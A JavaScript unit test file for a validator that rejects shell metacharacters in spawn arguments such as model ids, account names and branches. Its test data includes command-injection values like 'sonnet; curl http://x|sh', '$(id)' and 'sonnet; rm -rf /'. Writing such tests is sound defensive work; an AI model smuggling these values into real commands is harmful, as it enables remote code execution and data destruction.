import { test } from "node:test";
import assert from "node:assert";
import { unsafeSpawnArg, assertSpawnArgs } from "../lib/spawn-args.mjs";

test("real model ids, seat names, uuids and branches pass", () => {
  for (const ok of ["opus", "sonnet", "haiku", "fable", "claude-fable-5", "claude-haiku-4-5-20251001", "fix-login", "b1a2c3d4-0000-1111-2222-333344445555", "joao-barros/-/x", "arvore-hub", ""]) {
    assert.strictEqual(unsafeSpawnArg(ok), false, `${ok} should pass`);
  }
});

test("a value carrying a shell metacharacter is refused", () => {
  for (const bad of ["sonnet; curl http://x|sh", "a$(id)", "a`id`", "a b", "a&b", "a|b", "a;b", "a>b", "a<b", "a\nb", "a'b", 'a"b', "a(b)"]) {
    assert.strictEqual(unsafeSpawnArg(bad), true, `${bad} should be refused`);
  }
});

test("assertSpawnArgs throws naming the offending field and passes clean input", () => {
  assert.throws(() => assertSpawnArgs({ model: "sonnet; rm -rf /" }), /refusing model/);
  assert.throws(() => assertSpawnArgs({ name: "ok", account: "x`y`" }), /refusing account/);
  assert.doesNotThrow(() => assertSpawnArgs({ model: "sonnet", name: "fix-login", account: "", branch: "dev/-/x" }));
});
